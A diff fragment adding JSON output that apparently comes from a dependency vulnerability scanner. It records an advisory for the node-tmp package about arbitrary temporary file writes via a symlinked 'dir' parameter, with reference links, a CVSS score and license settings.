+                  "type": "WEB",
+                  "url": "https://github.com/raszi/node-tmp/issues/207"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/raszi/node-tmp/commit/188b25e529496e37adaf1a1d9dccb40019a08b1b"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/raszi/node-tmp"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.debian.org/debian-lts-announce/2025/08/msg00007.html"
+                }
+              ],
+              "related": [
+                "CGA-24xq-h2j3-3x86",
+                "CGA-6p3x-59vm-9fq8"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "tmp allows arbitrary temporary file / directory write via symbolic link `dir` parameter"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "experimental_config": {
+    "licenses": {
+      "summary": false,
+      "allowlist": null
+    }
+  }
+}
